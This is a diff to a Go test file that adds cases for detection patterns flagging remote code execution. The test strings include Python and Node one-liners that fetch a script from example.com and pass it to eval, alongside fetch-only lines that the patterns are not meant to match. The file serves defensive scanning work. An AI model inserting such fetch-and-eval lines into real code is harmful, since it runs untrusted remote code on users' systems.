@@ -441,6 +441,13 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		}
 	})
 
+	t.Run("detects python requests remote eval form", func(t *testing.T) {
+		line := `eval(requests.get("https://example.com/bootstrap.py").text)`
+		if !pythonRemoteExecPattern.MatchString(line) {
+			t.Fatalf("expected pythonRemoteExecPattern to match %q", line)
+		}
+	})
+
 	t.Run("does not match python requests fetch-only form", func(t *testing.T) {
 		line := `code = requests.get("https://example.com/bootstrap.py").text`
 		if pythonRemoteExecPattern.MatchString(line) {
@@ -455,8 +462,22 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		}
 	})
 
+	t.Run("detects node fetch text eval form", func(t *testing.T) {
+		line := `eval((await fetch("https://example.com/bootstrap.js")).text())`
+		if !nodeRemoteEvalPattern.MatchString(line) {
+			t.Fatalf("expected nodeRemoteEvalPattern to match %q", line)
+		}
+	})
+
 	t.Run("does not match node fetch-only form", func(t *testing.T) {
 		line := `const x = await fetch("https://example.com/bootstrap.js")`
+		if nodeRemoteEvalPattern.MatchString(line) {
+			t.Fatalf("unexpected nodeRemoteEvalPattern match for %q", line)
+		}
+	})
+
+	t.Run("does not match node fetch text without eval", func(t *testing.T) {
+		line := `const x = (await fetch("https://example.com/bootstrap.js")).text()`
 		if nodeRemoteEvalPattern.MatchString(line) {
 			t.Fatalf("unexpected nodeRemoteEvalPattern match for %q", line)
 		}
